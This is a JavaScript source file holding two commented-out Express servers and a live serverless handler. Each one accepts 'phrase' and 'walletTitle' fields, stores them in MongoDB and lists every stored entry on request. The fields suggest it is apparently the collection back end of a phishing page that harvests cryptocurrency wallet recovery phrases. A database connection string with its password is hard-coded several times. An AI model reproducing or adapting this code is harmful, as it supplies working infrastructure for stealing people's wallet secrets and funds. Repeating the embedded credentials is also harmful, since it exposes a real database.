// // const express = require("express");
// // const cors = require("cors");
// // const bodyParser = require("body-parser");
// // const mongoose = require("mongoose");
// // const app = express();

// // app.use(express.urlencoded({ extended: true }));
// // const PORT = process.env.PORT || 3000;

// // const mongodb =
// //   "mongodb+srv://New-express-user_13:user_13@cluster0.6xyca.mongodb.net/Form?retryWrites=true&w=majority";
// // mongoose
// //   .connect(mongodb, { useNewUrlParser: true, useUnifiedTopology: true })
// //   .then(() => {
// //     console.log("connected to MongoDB");
// //     app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
// //   })
// //   .catch((err) => console.log("Failed to connect to MongoDB", err));

// // // Middleware
// // app.use(cors());
// // app.use(bodyParser.urlencoded({ extended: false }));
// // app.use(bodyParser.json());

// // // Define a schema for form data
// // const formSchema = new mongoose.Schema({
// //   phrase: String,
// //   walletTitle: String,
// // });

// // // Create a model for form submissions
// // const Form = mongoose.model("Form", formSchema);

// // // Handle form submissions
// // app.post("/submit-form", async (req, res) => {
// //   const { phrase, walletTitle } = req.body;

// //   // Create a new form entry
// //   const newForm = new Form({
// //     phrase,
// //     walletTitle,
// //   });

// //   try {
// //     // Save the form data to MongoDB
// //     await newForm.save();
// //     console.log("Form data saved to MongoDB");

// //     // Send a response back to the client
// //     res.json({
// //       message: "Form data received and saved successfully!",
// //       data: { phrase, walletTitle },
// //     });
// //   } catch (err) {
// //     console.error("Error saving form data:", err);
// //     res.status(500).json({ message: "Error saving form data" });
// //   }
// // });


// const express = require("express");
// const cors = require("cors");
// const bodyParser = require("body-parser");
// const mongoose = require("mongoose");
// const app = express();

// app.use(express.urlencoded({ extended: true }));
// const PORT = process.env.PORT || 3000;

// const mongodb =
//   "mongodb+srv://New-express-user_13:user_13@cluster0.6xyca.mongodb.net/Form?retryWrites=true&w=majority";
// mongoose
//   .connect(mongodb, { useNewUrlParser: true, useUnifiedTopology: true })
//   .then(() => {
//     console.log("connected to MongoDB");
//     app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
//   })
//   .catch((err) => console.log("Failed to connect to MongoDB", err));

// // Middleware
// app.use(cors());
// app.use(bodyParser.urlencoded({ extended: false }));
// app.use(bodyParser.json());

// // Define a schema for form data
// const formSchema = new mongoose.Schema({
//   phrase: String,
//   walletTitle: String,
// });

// // Create a model for form submissions
// const Form = mongoose.model("Form", formSchema);

// // Handle form submissions
// app.post("/submit-form", async (req, res) => {
//   const { phrase, walletTitle } = req.body;

//   // Create a new form entry
//   const newForm = new Form({
//     phrase,
//     walletTitle,
//   });

//   try {
//     // Save the form data to MongoDB
//     await newForm.save();
//     console.log("Form data saved to MongoDB");

//     // Send a response back to the client
//     res.json({
//       message: "Form data received and saved successfully!",
//       data: { phrase, walletTitle },
//     });
//   } catch (err) {
//     console.error("Error saving form data:", err);
//     res.status(500).json({ message: "Error saving form data" });
//   }
// });

// // Route to get all form submissions
// app.get("/forms", async (req, res) => {
//   try {
//     // Retrieve all form submissions from MongoDB
//     const forms = await Form.find();
//     res.json({
//       message: "Form data retrieved successfully!",
//       data: forms,
//     });
//   } catch (err) {
//     console.error("Error retrieving form data:", err);
//     res.status(500).json({ message: "Error retrieving form data" });
//   }
// });

const { MongoClient } = require('mongodb');

let cachedDb = null;

async function connectToDatabase(uri) {
    if (cachedDb) {
        return cachedDb;
    }

    const client = await MongoClient.connect(uri, {
        useNewUrlParser: true,
        useUnifiedTopology: true,
    });

    cachedDb = client.db();
    return cachedDb;
}

exports.handler = async (event) => {
    const uri = process.env.MONGODB_URI || "mongodb+srv://New-express-user_13:user_13@cluster0.6xyca.mongodb.net/Form?retryWrites=true&w=majority";
    const db = await connectToDatabase(uri);
    const formCollection = db.collection('forms');

    let response;

    // Handle POST request for form submission
    if (event.httpMethod === 'POST' && event.path === '/submit-form') {
        const { phrase, walletTitle } = JSON.parse(event.body);

        // Create a new form entry
        const newForm = {
            phrase,
            walletTitle,
        };

        try {
            // Save form data to MongoDB
            await formCollection.insertOne(newForm);
            console.log("Form data saved to MongoDB");

            response = {
                statusCode: 200,
                body: JSON.stringify({
                    message: "Form data received and saved successfully!",
                    data: newForm,
                }),
            };
        } catch (err) {
            console.error("Error saving form data:", err);
            response = {
                statusCode: 500,
                body: JSON.stringify({ message: "Error saving form data" }),
            };
        }

    // Handle GET request to retrieve all form submissions
    } else if (event.httpMethod === 'GET' && event.path === '/forms') {
        try {
            const forms = await formCollection.find().toArray();
            response = {
                statusCode: 200,
                body: JSON.stringify({
                    message: "Form data retrieved successfully!",
                    data: forms,
                }),
            };
        } catch (err) {
            console.error("Error retrieving form data:", err);
            response = {
                statusCode: 500,
                body: JSON.stringify({ message: "Error retrieving form data" }),
            };
        }
    } else {
        response = {
            statusCode: 404,
            body: JSON.stringify({ message: "Route not found" }),
        };
    }

    return response;
};

